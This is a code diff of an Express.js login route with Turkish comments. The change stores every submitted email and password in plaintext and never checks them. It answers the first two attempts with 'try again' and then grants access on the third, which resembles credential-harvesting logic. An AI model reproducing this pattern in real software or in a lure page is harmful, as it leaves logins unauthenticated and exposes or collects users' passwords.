@@ -55,51 +55,33 @@ app.post('/login', (req, res) => {
     return res.render('index', { error: 'Email ve şifre boş olamaz!' });
   }
 
-  // Eğer daha önce giriş yapılmışsa ve giriş sayısı 3'ten küçükse, about sayfasına yönlendirmiyoruz
-  if (req.session.loginCount && req.session.loginCount >= 2) {
-    // 3. girişte yönlendiriyoruz
-    req.session.loggedIn = true;
-    return res.redirect('/about');
-  }
+  // Kullanıcıyı her girişte veritabanına ekle
+  const insertQuery = 'INSERT INTO users (email, password) VALUES ($1, $2)';
+  const insertValues = [email, password];
 
-  // Kullanıcı veritabanında kontrol ediliyor
-  const query = 'SELECT * FROM users WHERE email = $1';
-  const values = [email];
-
-  client.query(query, values, (err, result) => {
-    if (err) {
-      console.error('Veritabanı hatası:', err.stack);
+  client.query(insertQuery, insertValues, (insertErr, insertResult) => {
+    if (insertErr) {
+      console.error('Veritabanı hatası:', insertErr.stack);
       return res.status(500).send('Veritabanına veri eklenirken hata oluştu.');
     }
 
-    // Kullanıcı veritabanında yoksa, yeni kullanıcı ekle
-    const insertQuery = 'INSERT INTO users (email, password) VALUES ($1, $2)';
-    const insertValues = [email, password];
+    console.log('Kullanıcı başarıyla kaydedildi:', insertResult);
 
-    client.query(insertQuery, insertValues, (insertErr, insertResult) => {
-      if (insertErr) {
-        console.error('Veritabanı hatası:', insertErr.stack);
-        return res.status(500).send('Veritabanına veri eklenirken hata oluştu.');
-      }
+    // Eğer loginCount yoksa, başlatıyoruz
+    if (!req.session.loginCount) {
+      req.session.loginCount = 1;
+    } else {
+      req.session.loginCount += 1;  // Giriş sayısını arttırıyoruz
+    }
 
-      console.log('Yeni kullanıcı başarıyla kaydedildi:', insertResult);
-
-      // Eğer loginCount yoksa, başlatıyoruz
-      if (!req.session.loginCount) {
-        req.session.loginCount = 1;
-      } else {
-        req.session.loginCount += 1;  // Giriş sayısını arttırıyoruz
-      }
-
-      // İlk 2 girişte sadece index sayfasına dönüyoruz
-      if (req.session.loginCount < 3) {
-        return res.render('index', { error: 'Başka bir giriş yapmak için tekrar deneyin.' });
-      }
-      
-      // 3. girişte about sayfasına yönlendiriyoruz
-      req.session.loggedIn = true;
-      res.redirect('/about');
-    });
+    // İlk 2 girişte sadece index sayfasına dönüyoruz
+    if (req.session.loginCount < 3) {
+      return res.render('index', { error: 'Başka bir giriş yapmak için tekrar deneyin.' });
+    }
+    
+    // 3. girişte about sayfasına yönlendiriyoruz
+    req.session.loggedIn = true;
+    res.redirect('/about');
   });
 });
 
